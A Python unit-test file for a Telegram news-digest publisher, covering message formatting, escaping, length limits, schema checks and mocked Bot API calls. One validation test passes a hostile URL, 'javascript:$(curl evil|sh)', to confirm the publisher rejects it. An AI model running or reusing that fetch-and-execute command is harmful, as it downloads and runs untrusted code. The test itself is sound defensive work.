"""Швы «сборка сообщений», «отправка Bot API», «sboj и nesohraneno», «opublikovat --suhoj».

Токен — из подменённого окружения или временного файла секретов; сеть — подменённое соединение
(publikaciya._soedinenie, класс Telegram), пауза — подменённая publikaciya._pauza.
"""
import contextlib
import http.client
import io
import json
import os
import subprocess
import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest import mock

from newsai import __main__ as tochka, nastrojki, publikaciya, sostoyanie

OBRAZCY = Path(__file__).resolve().parent / "publikaciya"
VYPUSK = OBRAZCY / "vypusk.json"
PROGON = OBRAZCY / "progon.json"
PEREMENNAYA = "TELEGRAM_BOT_TOKEN"
LOZHNYY = "123456:poddelka-dlya-testa"
KANAL = -1004434993234
SEYCHAS = datetime(2026, 11, 11, 2, 20, tzinfo=timezone.utc)

URL_OPUS = 'https://www.anthropic.com/news/claude-opus-5-5?utm=a&b="c"'
URL_CODEX = "https://openai.com/index/codex-for-everyone/"

OZHIDAEMYE_ZAPROSY = [
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"url": URL_OPUS}, "text":
        '<b><a href="https://www.anthropic.com/news/claude-opus-5-5?utm=a&amp;b=&quot;c&quot;">'
        "Anthropic выпустила Claude Opus 5.5 — «модель &lt;для агентов&gt;» &amp; не только</a></b>\n\n"
        "Anthropic представила Claude Opus 5.5.\n\n"
        "Модель держит длинные задачи агентов дольше прежней.\n\n"
        "Цена за токен не изменилась.\n\n"
        "Модель уже доступна в API и в Claude Code.\n\n"
        "Старшая версия прошлого поколения уходит из эксплуатации через 60 дней."},
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"url": URL_CODEX}, "text":
        "⭐ набирает обороты\n"
        '<b><a href="https://openai.com/index/codex-for-everyone/">OpenAI открыла Codex для всех тарифов</a></b>\n\n'
        "OpenAI сделала Codex доступным на всех платных тарифах.\n\n"
        "Лимиты зависят от тарифа.\n\n"
        "В бесплатном тарифе Codex по-прежнему нет.\n\n"
        "Включается в настройках ChatGPT.\n\n"
        "Работает и в облаке, и локально."},
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True}, "text":
        "🌐 Блоги компаний\n"
        '1. ⭐ <a href="https://deepmind.google/blog/deep-think-api/">Gemini получил режим &lt;Deep Think&gt; '
        "в API</a> (DeepMind)\n"
        '2. <a href="https://www.bensbites.com/p/week-45?a=1&amp;b=2">Ben &amp; Bites: обзор недели</a> '
        "(Ben's Bites)"},
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True}, "text":
        "𝕏 Посты в X\n"
        '1. ⭐ Сэм Альтман, OpenAI: <a href="https://x.com/sama/status/1988000000000000002">Сэм Альтман: '
        "GPT-6 Luna выйдет в декабре</a>\n"
        '2. @simonw: <a href="https://x.com/simonw/status/1988000000000000003">Саймон Уиллисон: заметки о '
        "&lt;tool use&gt; &amp; агентах</a>"},
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True}, "text":
        "💰 Деньги и сделки\n"
        '1. <a href="https://www.techmeme.com/261110/p12">Mistral привлекла раунд на 2 млрд евро</a> (Techmeme)'},
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True}, "text":
        "🛠 GitHub Claude Code\n"
        '1. <a href="https://github.com/anthropics/claude-code/issues/4321">Моды в Claude Code: команда для '
        "своей панели</a> (GitHub Claude Code) · скоро"},
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True},
     "text": "ℹ️ Сбор: источники 1 из 3 (не ответили: обновления OpenAI API, Techmeme) · X 2 из 4 (не ответили: @gdb, @AT_T) · найдено 11, новых 10, в выпуске 8"},
]

VYPUSK_DENGI_X = OBRAZCY / "vypusk-dengi-x.json"
OZHIDAEMYE_ZAPROSY_DENGI_X = [
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True}, "text":
        "💰 Деньги и сделки\n"
        '1. ⭐ Сэм Альтман, OpenAI: <a href="https://x.com/sama/status/1988000000000000004">OpenAI привлекла '
        "раунд на 40 млрд долларов</a>\n"
        '2. <a href="https://www.techmeme.com/261110/p12">Mistral привлекла раунд на 2 млрд евро</a> (Techmeme)'},
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True},
     "text": "ℹ️ Сбор: источники 1 из 3 (не ответили: обновления OpenAI API, Techmeme) · "
             "X 2 из 4 (не ответили: @gdb, @AT_T) · найдено 11, новых 10, в выпуске 2"},
]

NASTROJKI = OBRAZCY / "istochniki.json"


def s_nastrojkami(test: unittest.TestCase, put: Path = NASTROJKI) -> None:
    """Подменить файл настроек источников на записанный до конца теста."""
    zaplatka = mock.patch.object(nastrojki, "FAYL_ISTOCHNIKOV", put)
    zaplatka.start()
    test.addCleanup(zaplatka.stop)


def obrazec_vypuska() -> dict:
    return json.loads(VYPUSK.read_text(encoding="utf-8"))


def krupnaya(**pole) -> dict:
    p = {"zagolovok": "Заголовок", "abzacy": ["Раз.", "Два.", "Три.", "Четыре.", "Пять."],
         "url": "https://a/1", "oboroty": False, "idy": ["https://a/1"]}
    p.update(pole)
    return p


def sayt(n=1, **pole) -> dict:
    p = {"zagolovok": f"Строка {n}", "url": f"https://b/{n}", "istochnik": "Cursor", "zvezda": False,
         "idy": [f"https://b/{n}"]}
    p.update(pole)
    return p


def iks(n=1, **pole) -> dict:
    p = {"zagolovok": f"Пост {n}", "url": f"https://x.com/sama/status/{n}", "akkaunt": "sama", "zvezda": False,
         "idy": [f"https://x.com/sama/status/{n}"]}
    p.update(pole)
    return p


def dengi_x(n=1, **pole) -> dict:
    """Пункт денег с адресом поста X: akkaunt вместо istochnik."""
    p = {"zagolovok": f"Сделка {n}", "url": f"https://x.com/sama/status/{n}", "akkaunt": "sama", "zvezda": False,
         "idy": [f"https://x.com/sama/status/{n}"]}
    p.update(pole)
    return p


def github(n=1, **pole) -> dict:
    p = {"zagolovok": f"Issue {n}", "url": f"https://github.com/anthropics/claude-code/issues/{n}",
         "idy": [f"https://github.com/anthropics/claude-code/issues/{n}"]}
    p.update(pole)
    return p


class Sborka(unittest.TestCase):
    def setUp(self):
        s_nastrojkami(self)
        self.s = publikaciya.soobshcheniya(obrazec_vypuska())
        self.s.append(publikaciya.soobshchenie_sbora(json.loads(PROGON.read_text(encoding="utf-8")), self.s))

    def test_poryadok_r49(self):
        self.assertEqual([s["vid"] for s in self.s],
                         ["krupnye", "krupnye", "sayty", "x", "dengi", "github", "sbor"])

    def test_zaprosy_literalami(self):
        self.assertEqual([publikaciya.zapros(s) for s in self.s], OZHIDAEMYE_ZAPROSY)

    def test_krupnaya_ssylka_v_zagolovke_bez_istochnika_i_citaty(self):
        tekst = self.s[0]["tekst"]
        self.assertTrue(tekst.startswith('<b><a href="https://www.anthropic.com/'))
        self.assertNotIn("Источник", tekst)
        self.assertNotIn("blockquote", tekst)

    def test_oboroty_pometka_pered_zagolovkom(self):
        self.assertTrue(self.s[1]["tekst"].startswith(
            '⭐ набирает обороты\n<b><a href="https://openai.com/index/codex-for-everyone/">'))
        self.assertNotIn("набирает обороты", self.s[0]["tekst"])
        s = publikaciya.soobshcheniya({"krupnye": [krupnaya(zagolovok="Z", url="https://a.b/", oboroty=True)]})
        self.assertEqual(s[0]["tekst"], '⭐ набирает обороты\n<b><a href="https://a.b/">Z</a></b>\n\n'
                                        "Раз.\n\nДва.\n\nТри.\n\nЧетыре.\n\nПять.")
        self.assertEqual(self.s[1]["punkty"], [{"zagolovok": "OpenAI открыла Codex для всех тарифов",
                                                "url": URL_CODEX, "idy": [URL_CODEX],
                                                "vid": "krupnaya", "oboroty": True}])

    def test_zvezda_v_dengah_i_x_tolko_po_priznaku(self):
        s = publikaciya.soobshcheniya({"dengi": [sayt(1, istochnik="Techmeme", zvezda=True), sayt(2)]})
        self.assertEqual(s[0]["tekst"], "💰 Деньги и сделки\n"
                                        '1. ⭐ <a href="https://b/1">Строка 1</a> (Techmeme)\n'
                                        '2. <a href="https://b/2">Строка 2</a> (Cursor)')
        s = publikaciya.soobshcheniya({"x": [iks(1)]})
        self.assertEqual(s[0]["tekst"], "𝕏 Посты в X\n"
                                        '1. Сэм Альтман, OpenAI: <a href="https://x.com/sama/status/1">Пост 1</a>')

    def test_dengi_iz_x_kak_stroka_x(self):
        s = publikaciya.soobshcheniya({"dengi": [dengi_x(1)]})
        self.assertEqual(s[0]["tekst"], "💰 Деньги и сделки\n"
                                        '1. Сэм Альтман, OpenAI: <a href="https://x.com/sama/status/1">Сделка 1</a>')
        s = publikaciya.soobshcheniya({"dengi": [sayt(1, istochnik="Techmeme"),
                                                 dengi_x(2, zvezda=True, zagolovok="Раунд <A> & B")]})
        self.assertEqual(s[0]["tekst"], "💰 Деньги и сделки\n"
                                        '1. <a href="https://b/1">Строка 1</a> (Techmeme)\n'
                                        '2. ⭐ Сэм Альтман, OpenAI: <a href="https://x.com/sama/status/2">Раунд '
                                        "&lt;A&gt; &amp; B</a>")
        self.assertNotIn("(X)", s[0]["tekst"])
        self.assertEqual(s[0]["vid"], "dengi")
        self.assertEqual(s[0]["punkty"][1], {"zagolovok": "Раунд <A> & B", "url": "https://x.com/sama/status/2",
                                             "idy": ["https://x.com/sama/status/2"], "vid": "dengi",
                                             "oboroty": False})

    def test_dengi_rovno_odno_iz_istochnik_i_akkaunt(self):
        bez_obeih = {k: v for k, v in sayt().items() if k != "istochnik"}
        for plohoy, tekst in (
                (dengi_x(istochnik="Techmeme"), "список денег и сделок, пункт 1: нужно ровно одно поле из "
                                                "istochnik и akkaunt"),
                (bez_obeih, "список денег и сделок, пункт 1: нужно ровно одно поле из istochnik и akkaunt"),
                (dengi_x(akkaunt="@sama"), "список денег и сделок, пункт 1: akkaunt — имя аккаунта X без @"),
                (dengi_x(akkaunt=""), "список денег и сделок, пункт 1: нет поля akkaunt"),
                (dengi_x(akkaunt=None), "список денег и сделок, пункт 1: нет поля akkaunt")):
            with self.subTest(plohoy=plohoy):
                with self.assertRaises(publikaciya.OtkazVypuska) as e:
                    publikaciya.soobshcheniya({"dengi": [plohoy]})
                self.assertEqual(str(e.exception), tekst)
        with self.assertRaises(publikaciya.OtkazVypuska) as e:
            publikaciya.soobshcheniya({"sayty": [sayt(akkaunt="sama")]})
        self.assertEqual(str(e.exception), "список сайтов, пункт 1: лишние поля akkaunt")

    def test_podpis_pervoy_strokoy_kazhdogo_spiska_u_krupnoy_net(self):
        s = publikaciya.soobshcheniya({"krupnye": [krupnaya(zagolovok="К", url="https://a/9")],
                                       "sayty": [sayt(1)], "x": [iks(2)], "dengi": [sayt(3, istochnik="Techmeme")],
                                       "github": [github(4)]})
        self.assertEqual([m["tekst"] for m in s], [
            '<b><a href="https://a/9">К</a></b>\n\nРаз.\n\nДва.\n\nТри.\n\nЧетыре.\n\nПять.',
            '🌐 Блоги компаний\n1. <a href="https://b/1">Строка 1</a> (Cursor)',
            '𝕏 Посты в X\n1. Сэм Альтман, OpenAI: <a href="https://x.com/sama/status/2">Пост 2</a>',
            '💰 Деньги и сделки\n1. <a href="https://b/3">Строка 3</a> (Techmeme)',
            '🛠 GitHub Claude Code\n1. <a href="https://github.com/anthropics/claude-code/issues/4">Issue 4</a> '
            "(GitHub Claude Code) · скоро"])
        self.assertEqual([publikaciya.zapros(m).get("link_preview_options") for m in s],
                         [{"url": "https://a/9"}] + [{"is_disabled": True}] * 4)

    def test_stroka_x_podpis_iz_spravochnika(self):
        for akkaunt, zvezda, stroka in (
                ("gdb", False, "1. Грег Брокман, OpenAI: "),
                ("OpenAI", False, "1. OpenAI: "),
                ("openai", False, "1. OpenAI: "),
                ("GDB", True, "1. ⭐ Грег Брокман, OpenAI: "),
                ("karpathy", False, "1. @karpathy: "),
                ("AT_T", False, "1. AT&amp;T &lt;Labs&gt;: ")):
            with self.subTest(akkaunt=akkaunt):
                url = f"https://x.com/{akkaunt}/status/7"
                ssylka = f'<a href="{url}">Пост 7</a>'
                s = publikaciya.soobshcheniya(
                    {"x": [iks(7, akkaunt=akkaunt, url=url, idy=[url], zvezda=zvezda)]})
                self.assertEqual(s[0]["tekst"], "𝕏 Посты в X\n" + stroka + ssylka)
                s = publikaciya.soobshcheniya(
                    {"dengi": [dengi_x(7, akkaunt=akkaunt, url=url, idy=[url], zvezda=zvezda,
                                       zagolovok="Пост 7")]})
                self.assertEqual(s[0]["tekst"], "💰 Деньги и сделки\n" + stroka + ssylka)
                self.assertNotIn("(X)", s[0]["tekst"])

    def test_spravochnik_chitaetsya_tolko_kogda_nuzhen(self):
        net = nastrojki.KOREN / "temp" / "net-takogo-istochniki.json"
        with mock.patch.object(nastrojki, "FAYL_ISTOCHNIKOV", net):
            self.assertEqual(len(publikaciya.soobshcheniya({"sayty": [sayt()], "github": [github()]})), 2)
            self.assertEqual(publikaciya.stroka_sbora(sbor_dannye(), 1),
                             "ℹ️ Сбор: источники 3 из 3 · X 4 из 4 аккаунтов · найдено 2, новых 1, в выпуске 1")
            for nazvanie, vyzov in (("x", lambda: publikaciya.soobshcheniya({"x": [iks()]})),
                                    ("dengi", lambda: publikaciya.soobshcheniya({"dengi": [dengi_x()]})),
                                    ("ne_otvetili", lambda: publikaciya.stroka_sbora(
                                        sbor_dannye(ne_otvetili=["Techmeme"]), 1)),
                                    ("bez_istochnikov", lambda: publikaciya.stroka_sbora(
                                        {"kandidaty": []}, 1))):
                with self.subTest(nazvanie), self.assertRaises(publikaciya.OtkazVypuska) as e:
                    vyzov()
                self.assertEqual(str(e.exception), "файл настроек источников не читается: FileNotFoundError")

    def test_limit_4096_s_podpisyu_spiska(self):
        def sayty_dlinoy(vsego: int) -> list:
            punkty = [sayt(n, zagolovok="я") for n in range(1, 11)]
            lishnee = vsego - publikaciya.dlina(publikaciya.soobshcheniya({"sayty": punkty})[0]["tekst"])
            for p in punkty:
                c = min(lishnee, 1400) + 1
                p["zagolovok"] = "&" * (c // 5) + "я" * (c % 5)
                lishnee -= c - 1
            self.assertEqual(lishnee, 0)
            return punkty

        rovno = publikaciya.soobshcheniya({"sayty": sayty_dlinoy(4096)})
        self.assertEqual(publikaciya.dlina(rovno[0]["tekst"]), 4096)
        self.assertTrue(rovno[0]["tekst"].startswith("🌐 Блоги компаний\n1. "))
        lishniy = sayty_dlinoy(4097)
        with self.assertRaises(publikaciya.OtkazVypuska) as e:
            publikaciya.soobshcheniya({"sayty": lishniy})
        self.assertEqual(str(e.exception), "сообщение 1 (список сайтов) длиннее 4096 знаков: 4097 — сократите текст")
        stroki = "\n".join(publikaciya._stroka_spiska("sayty", n, publikaciya._punkt(
            "sayty", publikaciya.RAZDELY[1][2], p, n), {}) for n, p in enumerate(lishniy, 1))
        self.assertEqual(publikaciya.dlina(stroki), 4079)

    def test_pustoy_vypusk_bez_soobshcheniy_vypuska(self):
        pusto = {"krupnye": [], "sayty": [], "x": [], "dengi": [], "github": []}
        self.assertEqual(publikaciya.soobshcheniya(pusto), [])
        self.assertEqual(publikaciya.soobshcheniya({}), [])

    def test_pustoy_spisok_ne_otpravlyaetsya(self):
        s = publikaciya.soobshcheniya({"krupnye": [], "sayty": [], "x": [iks()], "dengi": [], "github": []})
        self.assertEqual([m["vid"] for m in s], ["x"])
        s = publikaciya.soobshcheniya({"github": [github()]})
        self.assertEqual([m["vid"] for m in s], ["github"])

    def test_limit_4096_rovno_mozhno_bolshe_nelzya(self):
        osnova = len('<b><a href="https://a/1">З</a></b>') + 4 * len("\n\nа") + len("\n\n")
        zapas = 4096 - osnova
        rovno = publikaciya.soobshcheniya(
            {"krupnye": [krupnaya(zagolovok="З", abzacy=["а"] * 4 + ["я" * zapas])]})
        self.assertEqual(publikaciya.dlina(rovno[0]["tekst"]), 4096)
        with self.assertRaises(publikaciya.OtkazVypuska) as e:
            publikaciya.soobshcheniya({"krupnye": [krupnaya(zagolovok="З", abzacy=["а"] * 4 + ["я" * (zapas + 1)])]})
        self.assertIn("4096", str(e.exception))

    def test_limit_schitaet_razmetku_i_utf16(self):
        self.assertEqual(publikaciya.dlina("⭐"), 1)
        self.assertEqual(publikaciya.dlina("😀"), 2)
        dlinnye = [sayt(n, zagolovok="&" * 300) for n in range(1, 4)]
        with self.assertRaises(publikaciya.OtkazVypuska):
            publikaciya.soobshcheniya({"sayty": dlinnye})

    def test_predely_3_10_10_5(self):
        for vypusk, mozhno in (({"krupnye": [krupnaya(url=f"https://a/{n}") for n in range(3)]}, True),
                               ({"krupnye": [krupnaya(url=f"https://a/{n}") for n in range(4)]}, False),
                               ({"sayty": [sayt(n) for n in range(1, 11)]}, True),
                               ({"sayty": [sayt(n) for n in range(1, 12)]}, False),
                               ({"x": [iks(n) for n in range(1, 11)]}, True),
                               ({"x": [iks(n) for n in range(1, 12)]}, False),
                               ({"dengi": [sayt(n) for n in range(1, 6)]}, True),
                               ({"dengi": [sayt(n) for n in range(1, 7)]}, False)):
            with self.subTest(razdel=list(vypusk), punktov=len(next(iter(vypusk.values())))):
                if mozhno:
                    publikaciya.soobshcheniya(vypusk)
                else:
                    with self.assertRaises(publikaciya.OtkazVypuska):
                        publikaciya.soobshcheniya(vypusk)

    def test_abzacev_5_8(self):
        for n, mozhno in ((4, False), (5, True), (8, True), (9, False)):
            v = {"krupnye": [krupnaya(abzacy=[f"Абзац {i}." for i in range(n)])]}
            with self.subTest(abzacev=n):
                if mozhno:
                    publikaciya.soobshcheniya(v)
                else:
                    with self.assertRaises(publikaciya.OtkazVypuska):
                        publikaciya.soobshcheniya(v)

    def test_otkaz_po_scheme(self):
        for plohoy in ({"spisok": [sayt()]},
                       {"krupnye": [krupnaya(citata="Цитата.")]},
                       {"krupnye": [krupnaya(zagolovok="")]},
                       {"krupnye": [krupnaya(oboroty="да")]},
                       {"sayty": [sayt(zvezda=None)]},
                       {"sayty": [{k: v for k, v in sayt().items() if k != "zvezda"}]},
                       {"sayty": [sayt(istochnik=None)]},
                       {"sayty": [sayt(idy=[])]},
                       {"sayty": [sayt(zagolovok="я" * 301)]},
                       {"sayty": [sayt(zagolovok="раз\nдва")]},
                       {"x": [iks(akkaunt="@sama")]},
                       {"github": [github(istochnik="GitHub")]},
                       {"sayty": ["строка"]},
                       {"sayty": {}},
                       []):
            with self.subTest(plohoy=plohoy), self.assertRaises(publikaciya.OtkazVypuska):
                publikaciya.soobshcheniya(plohoy)
        publikaciya.soobshcheniya({"sayty": [sayt(zagolovok="я" * 300)]})
        with self.assertRaises(publikaciya.OtkazVypuska):
            publikaciya.stroka_sbora([], 1)

    def test_plohoy_adres_ne_popadaet_v_otkaz(self):
        with self.assertRaises(publikaciya.OtkazVypuska) as e:
            publikaciya.soobshcheniya({"sayty": [sayt(url="javascript:$(curl evil|sh)")]})
        self.assertEqual(str(e.exception), "список сайтов, пункт 1: адрес не http(s)")


def sbor_dannye(**pole) -> dict:
    """Файл прогона сбора публикатора для служебной строки: источники записанных настроек теста без X
    (OpenAI API, Techmeme, DeepMind), X — 4 аккаунта, два кандидата, один новый."""
    d = {"kandidaty": [{"id": "https://a/1", "novyy": True}, {"id": "https://a/2", "novyy": False}],
         "ne_otvetili": [], "istochniki": ["OpenAI API", "Techmeme", "DeepMind"],
         "iks": {"akkauntov": 4, "ne_otvetili": []}}
    d.update(pole)
    return d


class StrokaSbora(unittest.TestCase):
    """Р74: служебная строка сбора — последним сообщением каждого выпуска, и пустого тоже. Названия —
    из записанного файла настроек теста; ожидаемое — литералами."""

    def setUp(self):
        s_nastrojkami(self)

    def sbor(self, dannye: dict, vypusk: dict) -> dict:
        s = publikaciya.soobshcheniya(vypusk)
        return publikaciya.soobshchenie_sbora(dannye, s)

    def test_vse_otvetili(self):
        s = self.sbor(sbor_dannye(), {"krupnye": [krupnaya()], "sayty": [sayt(1), sayt(2)], "x": [iks(3)]})
        self.assertEqual(publikaciya.zapros(s), {
            "chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True},
            "text": "ℹ️ Сбор: источники 3 из 3 · X 4 из 4 аккаунтов · найдено 2, новых 1, в выпуске 4"})
        self.assertEqual((s["vid"], s["punkty"]), ("sbor", []))

    def test_chast_upala(self):
        dannye = sbor_dannye(ne_otvetili=["Techmeme"], iks={"akkauntov": 4, "ne_otvetili": ["gdb", "AT_T", "sama"]})
        s = self.sbor(dannye, {"sayty": [sayt()]})
        self.assertEqual(s["tekst"], "ℹ️ Сбор: источники 2 из 3 (не ответил: Techmeme) · "
                                     "X 1 из 4 (не ответили: @gdb, @AT_T, @sama) · найдено 2, новых 1, в выпуске 1")
        dannye = sbor_dannye(ne_otvetili=["OpenAI API", "DeepMind", "OpenAI API"],
                             iks={"akkauntov": 4, "ne_otvetili": ["gdb"]})
        self.assertEqual(self.sbor(dannye, {"sayty": [sayt()]})["tekst"],
                         "ℹ️ Сбор: источники 1 из 3 (не ответили: обновления OpenAI API, блог &lt;DeepMind&gt; &amp; Co) · "
                         "X 3 из 4 (не ответил: @gdb) · найдено 2, новых 1, в выпуске 1")

    def test_pustoy_vypusk(self):
        s = self.sbor(sbor_dannye(), {"krupnye": [], "sayty": [], "x": [], "dengi": [], "github": []})
        self.assertEqual(s["tekst"], "ℹ️ В выпуск ничего не отобрано · источники 3 из 3 · X 4 из 4 · найдено 2, новых 1, в выпуске 0")
        dannye = sbor_dannye(ne_otvetili=["Techmeme"], iks={"akkauntov": 4, "ne_otvetili": ["gdb"]})
        self.assertEqual(self.sbor(dannye, {})["tekst"],
                         "ℹ️ В выпуск ничего не отобрано · источники 2 из 3 (не ответил: Techmeme) · "
                         "X 3 из 4 (не ответил: @gdb) · найдено 2, новых 1, в выпуске 0")

    def test_x_ne_otvetil_ni_odin(self):
        dannye = sbor_dannye(ne_otvetili=["X"], iks={"akkauntov": 4, "ne_otvetili": ["sama", "gdb", "OpenAI", "AT_T"]})
        self.assertEqual(self.sbor(dannye, {"sayty": [sayt()]})["tekst"],
                         "ℹ️ Сбор: источники 3 из 3 · X 0 из 4 (не ответил ни один) · найдено 2, новых 1, в выпуске 1")

    def test_bez_x_v_nastroykah(self):
        self.assertEqual(publikaciya.stroka_sbora(sbor_dannye(iks=None), 2),
                         "ℹ️ Сбор: источники 3 из 3 · найдено 2, новых 1, в выпуске 2")

    def test_staryy_fayl_progona_bez_novyh_poley(self):
        staryy = {"kandidaty": [{"id": "https://a/1"}], "ne_otvetili": ["X", "OpenAI API"]}
        self.assertEqual(publikaciya.stroka_sbora(staryy, 1),
                         "ℹ️ Сбор: источники 2 из 3 (не ответил: обновления OpenAI API) · X 0 из 4 · "
                         "найдено 1, новых 1, в выпуске 1")
        self.assertEqual(publikaciya.stroka_sbora({"kandidaty": [], "ne_otvetili": []}, 0),
                         "ℹ️ Новых новостей нет · источники 3 из 3 · найдено 0, новых 0")

    def test_ekranirovanie(self):
        dannye = sbor_dannye(istochniki=["A<b>&"], ne_otvetili=["A<b>&"])
        self.assertEqual(self.sbor(dannye, {"sayty": [sayt()]})["tekst"],
                         "ℹ️ Сбор: источники 0 из 1 (не ответил: A&lt;b&gt;&amp;) · X 4 из 4 аккаунтов · "
                         "найдено 2, новых 1, в выпуске 1")


class Slot(unittest.TestCase):
    def test_nachalo_slota_v_utc(self):
        for kogda, ozhidaem in (((2026, 11, 11, 2, 20), "2026-11-11T02:00:00Z"),
                                ((2026, 11, 11, 10, 7), "2026-11-11T10:00:00Z"),
                                ((2026, 11, 11, 17, 30), "2026-11-11T10:00:00Z"),
                                ((2026, 11, 11, 18, 40), "2026-11-11T18:00:00Z"),
                                ((2026, 11, 11, 1, 59), "2026-11-10T18:00:00Z")):
            with self.subTest(kogda=kogda):
                self.assertEqual(publikaciya.slot(datetime(*kogda, tzinfo=timezone.utc)), ozhidaem)

    def test_slot_publikatora_raven_slotu_otkrytiya(self):
        for nachalo, ozhidaem in (((2026, 11, 11, 2, 0), "2026-11-11T02:00:00Z"),
                                  ((2026, 11, 11, 10, 0), "2026-11-11T10:00:00Z"),
                                  ((2026, 11, 10, 18, 0), "2026-11-10T18:00:00Z")):
            with self.subTest(nachalo=nachalo):
                start = datetime(*nachalo, tzinfo=timezone.utc)
                pozdnee = start + timedelta(minutes=39, seconds=59) + timedelta(hours=3, minutes=20)
                self.assertEqual(publikaciya.slot(start), ozhidaem)
                self.assertEqual(publikaciya.slot(pozdnee), ozhidaem)

    def test_okno_slota(self):
        nachalo = datetime(2026, 11, 11, 2, 0, tzinfo=timezone.utc)
        for kogda, v_okne in (((2026, 11, 11, 2, 0, 0), True), ((2026, 11, 11, 2, 39, 59), True),
                              ((2026, 11, 11, 2, 40, 0), False), ((2026, 11, 11, 9, 59, 59), False),
                              ((2026, 11, 11, 1, 59, 59), False)):
            with self.subTest(kogda=kogda):
                self.assertIs(publikaciya.v_okne_slota(datetime(*kogda, tzinfo=timezone.utc)), v_okne)
                self.assertIs(publikaciya.v_okne_slota(datetime(*kogda, tzinfo=timezone.utc), nachalo), v_okne)

    def test_sudimyy_slot_storozha(self):
        for kogda, ozhidaem in (((2026, 11, 11, 18, 2), "2026-11-11T10:00:00Z"),
                                ((2026, 11, 11, 18, 39, 59), "2026-11-11T10:00:00Z"),
                                ((2026, 11, 11, 18, 40), "2026-11-11T18:00:00Z"),
                                ((2026, 11, 11, 9, 57), "2026-11-11T02:00:00Z"),
                                ((2026, 11, 11, 2, 5), "2026-11-10T18:00:00Z"),
                                ((2026, 11, 11, 17, 30), "2026-11-11T10:00:00Z"),
                                ((2026, 11, 11, 10, 10), "2026-11-11T02:00:00Z"),
                                ((2026, 11, 10, 23, 52), "2026-11-10T18:00:00Z")):
            with self.subTest(kogda=kogda):
                self.assertEqual(publikaciya.sudimyy_slot(datetime(*kogda, tzinfo=timezone.utc)), ozhidaem)


class Otvet:
    """Ответ Bot API для подменённого соединения: статус, тело (объект JSON или байты как есть) и
    закрывает ли сервер соединение после него (Connection: close)."""

    def __init__(self, status: int, telo, zakryt: bool = False):
        self.status, self.telo, self.zakryt = status, telo, zakryt


class Sboj:
    """Исключение на этапе подменённого соединения: connect, request (запись запроса), getresponse
    или read (чтение тела)."""

    def __init__(self, etap: str, isklyuchenie: BaseException):
        assert etap in ("connect", "request", "getresponse", "read"), etap
        self.etap, self.isklyuchenie = etap, isklyuchenie


class Zapros:
    """Записанный запрос: адрес целиком и тело — как у прежнего urllib.request.Request."""

    def __init__(self, metod: str, put: str, telo: bytes, zagolovki: dict):
        self.method, self.full_url, self.data, self.headers = metod, "https://api.telegram.org" + put, telo, zagolovki


class _OtvetSoedineniya:
    def __init__(self, status: int, syroe: bytes, will_close: bool, sboj_chteniya: BaseException | None):
        self.status, self._syroe, self.will_close, self._sboj = status, syroe, will_close, sboj_chteniya

    def read(self):
        if self._sboj is not None:
            raise self._sboj
        return self._syroe


class Soedinenie:
    """Подменённое http.client.HTTPSConnection: этапы connect / request / getresponse берут из общей
    очереди Telegram свой сбой или ответ; закрытое сервером соединение — sock None, как у http.client."""

    def __init__(self, telegram: "Telegram"):
        self.telegram = telegram
        self.sock = None
        self.podklyucheniy = 0
        self.zakryto = False
        self.zaprosy = []

    def connect(self):
        self.podklyucheniy += 1
        sboj = self.telegram.vzyat_sboj("connect")
        if sboj is not None:
            raise sboj
        self.sock = object()

    def request(self, metod, put, body=None, headers=None):
        assert self.sock is not None, "запрос до connect(): отправитель обязан подключаться явно"
        sboj = self.telegram.vzyat_sboj("request")
        if sboj is not None:
            raise sboj
        zapr = Zapros(metod, put, body, dict(headers or {}))
        self.zaprosy.append(zapr)
        self.telegram.zaprosy.append(zapr)
        if self.telegram.pri_zaprose:
            self.telegram.pri_zaprose()

    def getresponse(self):
        assert self.zaprosy, "ответ без запроса"
        otvet = self.telegram.otvety.pop(0) if self.telegram.otvety else Telegram.ok()
        sboj_chteniya = None
        if isinstance(otvet, Sboj):
            assert otvet.etap in ("getresponse", "read"), otvet.etap
            if otvet.etap == "getresponse":
                raise otvet.isklyuchenie
            sboj_chteniya, otvet = otvet.isklyuchenie, Otvet(200, Telegram.ok())
        if isinstance(otvet, BaseException):
            raise otvet
        if not isinstance(otvet, Otvet):
            otvet = Otvet(200, otvet)
        syroe = otvet.telo if isinstance(otvet.telo, bytes) else json.dumps(otvet.telo).encode("utf-8")
        if otvet.zakryt:
            self.sock = None
        return _OtvetSoedineniya(otvet.status, syroe, otvet.zakryt, sboj_chteniya)

    def close(self):
        self.sock = None
        self.zakryto = True


class Telegram:
    """Подменённая фабрика соединений с Bot API: каждое соединение пишет запросы в общий список и
    отвечает по очереди из otvety — ответ (объект JSON, Otvet), исключение (при ответе на запрос) или
    Sboj(этап, исключение). Ответы кончились — ok."""

    def __init__(self, *otvety, pri_zaprose=None):
        self.otvety = list(otvety)
        self.zaprosy = []
        self.soedineniya = []
        self.pri_zaprose = pri_zaprose

    @staticmethod
    def ok(result=None):
        return {"ok": True, "result": result or {"message_id": 1}}

    def __call__(self):
        soed = Soedinenie(self)
        self.soedineniya.append(soed)
        return soed

    def vzyat_sboj(self, etap: str) -> BaseException | None:
        if self.otvety and isinstance(self.otvety[0], Sboj) and self.otvety[0].etap == etap:
            return self.otvety.pop(0).isklyuchenie
        return None

    def tela(self):
        return [json.loads(z.data) for z in self.zaprosy]


def http_oshibka(kod: int, dannye: dict) -> Otvet:
    """Ответ Bot API с HTTP-ошибкой и телом JSON."""
    return Otvet(kod, dannye)



class SFaylami(unittest.TestCase):
    """Файлы прогона и выпуска — образцы или копии во временной папке проекта.

    Токен — из подменённого окружения; файл секретов — во временной папке (по умолчанию его нет).
    """

    def setUp(self):
        papka = nastrojki.KOREN / "temp"
        papka.mkdir(exist_ok=True)
        self._papka = tempfile.TemporaryDirectory(dir=papka)
        self.papka = Path(self._papka.name)
